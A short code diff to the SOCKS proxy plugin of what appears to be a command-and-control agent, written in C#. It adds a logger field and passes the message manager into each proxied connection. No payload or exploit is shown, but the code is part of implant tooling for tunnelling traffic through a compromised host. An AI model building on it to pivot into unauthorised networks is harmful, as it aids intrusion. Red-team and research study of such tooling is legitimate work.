@@ -9,11 +9,13 @@ namespace Agent
     {
         public string Name => "socks";
         private IMessageManager messageManager { get; set; }
+        private ILogger logger { get; set; }
         private ConcurrentDictionary<int, ConnectionConfig> connections { get; set; }
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
         {
             this.messageManager = messageManager;
             this.connections = new ConcurrentDictionary<int, ConnectionConfig>();
+            this.logger = logger;
         }
 
         public async Task Execute(ServerJob job)
@@ -33,7 +35,6 @@ namespace Agent
             }
 
             //We already know about this packet, so lets continue
-
             if (!string.IsNullOrEmpty(sm.data)) //If the packet contains data we can do something with it
             {
                 if (connections[sm.server_id].IsConnected()) //Check if our connection is alive
@@ -88,7 +89,7 @@ namespace Agent
                     return;
                 }
 
-                ConnectionConfig sc = new ConnectionConfig(co); //Create Socks Connection Object, and try to connect
+                ConnectionConfig sc = new ConnectionConfig(co, messageManager); //Create Socks Connection Object, and try to connect
                 await AddConnection(sc); //Add our connection to the Dictionary;
 
                 sc.client.RunAsync(); //Connect to the endpoint
